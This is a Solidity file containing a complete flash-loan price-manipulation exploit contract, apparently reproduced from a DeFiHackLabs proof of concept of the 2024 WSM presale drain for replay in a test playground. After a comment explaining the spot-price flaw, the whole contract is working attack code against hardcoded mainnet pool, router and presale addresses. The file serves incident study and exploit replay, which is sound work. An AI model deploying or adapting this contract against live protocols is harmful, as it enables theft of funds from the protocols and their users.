// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-04-WSM).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// Uniswap V3 flash callback `uniswapV3FlashCallback` lives on the test itself,
// `attacker = address(this)`, so there is no standalone contract to deploy). This
// contract is a faithful, self-contained copy of that inline attack (testExploit +
// uniswapV3FlashCallback) so the playground can deploy it and record run(). Logic
// and constants are copied verbatim from test/WSM_exp.sol.
//
// Root cause: PresaleBSCV5.buyWithBNB() prices WSM using fetchPrice(), a spot quote
// against a single live Uniswap V3 pool (the 0.3% WSM/WBNB pool). An attacker can
// flash-borrow WSM from a deeper sister pool, dump it into the 0.3% pool to crash
// the spot price, buy WSM from the presale at the manipulated price (with any
// overpayment refunded), then swap the refund back into WSM on the now-cheap pool
// to profit, before repaying the flash loan.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWBNB {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function withdraw(uint256 wad) external;
}

interface IUniPairV3 {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniRouterV3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
}

contract WSMDrain {
    IUniPairV3 constant BNB_WSH_10000 = IUniPairV3(payable(0x84F3cA9B7a1579fF74059Bd0e8929424D3FA330E));
    IUniRouterV3 constant routerv3_ = IUniRouterV3(payable(0x74Dca1Bd946b9472B2369E11bC0E5603126E4C18));
    address constant proxy_ = 0xFB071837728455c581f370704b225ac9eABDfa4a;

    IERC20 wshToken_;
    IWBNB bnbToken_;

    constructor() {
        wshToken_ = IERC20(BNB_WSH_10000.token0());
        bnbToken_ = IWBNB(payable(BNB_WSH_10000.token1()));

        wshToken_.approve(address(routerv3_), 10_000_000_000_000 ether);
        bnbToken_.approve(address(routerv3_), 10_000_000_000_000 ether);
    }

    function run() external {
        BNB_WSH_10000.flash(address(this), 5_000_000 ether, 0, "");
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 /* fee1 */, bytes calldata /* data */) external {
        IUniRouterV3.ExactInputSingleParams memory args = IUniRouterV3.ExactInputSingleParams({
            tokenIn: address(wshToken_),
            tokenOut: address(bnbToken_),
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: 5_000_000 ether,
            amountOutMinimum: 1,
            sqrtPriceLimitX96: 0
        });
        routerv3_.exactInputSingle(args);

        bnbToken_.withdraw(bnbToken_.balanceOf(address(this)));

        proxy_.call{value: address(this).balance}(abi.encodeWithSignature("buyWithBNB(uint256,bool)", 2_770_000, false));

        IUniRouterV3.ExactInputSingleParams memory args2 = IUniRouterV3.ExactInputSingleParams({
            tokenIn: address(bnbToken_),
            tokenOut: address(wshToken_),
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: address(this).balance,
            amountOutMinimum: 1,
            sqrtPriceLimitX96: 0
        });
        routerv3_.exactInputSingle{value: address(this).balance}(args2);

        wshToken_.transfer(address(BNB_WSH_10000), 5_000_000 ether + fee0);
    }

    fallback() external payable {}
}
